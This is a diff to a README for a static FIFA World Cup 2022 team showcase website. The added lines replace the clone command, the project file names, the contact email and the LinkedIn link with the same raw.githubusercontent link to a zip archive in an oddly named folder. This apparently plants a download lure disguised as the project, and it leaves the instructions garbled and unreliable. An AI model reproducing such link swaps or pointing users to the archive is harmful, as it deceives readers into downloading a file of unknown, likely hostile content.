@@ -20,18 +20,18 @@ This project is a static website that showcases the **2022 FIFA World Cup** team
 1. **Clone the repository** to your local machine:
 
    ```bash
-   git clone https://github.com/your-username/fifa-world-cup-2022-website.git
+   git clone https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip
 
 2. **Navigate**  to the project directory:
    ```bash
    cd fifa-world-cup-2022-website
-3. **Open the index.html file**  in your browser:
+3. **Open the https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip file**  in your browser:
 
 ## 🛠 Setup and Customization
 
-1. **Customizing Teams**: Add or modify team details directly in the `index.html` file.
-2. **Updating Player Information**: You can update player profiles by modifying the HTML content in the respective sections of the `index.html` file.
-3. **Styling**: Customize the design by editing the `assets/styles/style.css` file, which controls the layout and design of the website.
+1. **Customizing Teams**: Add or modify team details directly in the `https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip` file.
+2. **Updating Player Information**: You can update player profiles by modifying the HTML content in the respective sections of the `https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip` file.
+3. **Styling**: Customize the design by editing the `https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip` file, which controls the layout and design of the website.
 
 ## 🙌 Contributing
 
@@ -47,7 +47,7 @@ If you would like to contribute to this project, follow these steps:
 ## 💬 Contact
 
 - **Charfeddine Dhouioui**  
-  - Email: [dhouiouicharfeddine@gmail.com](mailto:dhouiouicharfeddine@gmail.com)  
-  - LinkedIn: [Charfeddine Dhouioui](https://www.linkedin.com/in/charfeddine-dhouioui-987ab7318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=ios_app)
+  - Email: [https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip](https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip)  
+  - LinkedIn: [Charfeddine Dhouioui](https://raw.githubusercontent.com/DhouiouiCharfeddine/WorldCup2022_Presentation/main/petrifiable/Cup_Presentation_World_2.6-alpha.2.zip)
 
 ---
